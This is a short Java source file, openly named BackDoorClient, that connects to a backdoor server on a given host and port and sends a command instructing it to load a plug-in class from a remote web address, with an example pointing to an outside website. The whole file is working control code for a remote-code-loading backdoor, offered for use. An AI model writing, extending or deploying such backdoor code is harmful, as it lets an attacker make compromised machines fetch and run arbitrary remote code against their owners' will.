//BackDoorClient
// Import all the classes we need
import java.io.OutputStream ;
import java.net.Socket ;

public class BackDoorClient {
	// This method will be called first
	// The format is: java BackDoorClient <Server> <Port> <PlugInLocation*PlugInName>
	//an example:
	//
	// java BackDoorClient localhost 2323 http://e-xistenz.net/*WindowPlugIn
	//
	// This will cause the client to connect to a server on your own machine on port 2323 and make the server load the   // class WindowPlugIn from my website NOTE: 
	// 1) The location and the name of the PlugIn are seperated by "*"
	// 2) The / before the * is important to tell the URLClassLoader to search in the Directory !
	public static void main(String args[]) {
	try {
		// Get the command line parameters
		String	server	= args[0] ;
		int	port = (new Integer(args[1])).intValue() ;
		String command = args[2] ;
		
		// Connect to the server and get the OutPutStream to tell the server what to do  
		Socket clientSocket = new Socket(server, port) ;
		OutputStream out = clientSocket.getOutputStream() ;

		// Communicate with the server
		out.write(command.getBytes()) ;

		// That's it ! ... Close everything before we leave
		out.close() ;
		clientSocket.close() ;
	} catch(Throwable t) {
		// Ok ... display the error information
		t.printStackTrace() ;
	}
}
}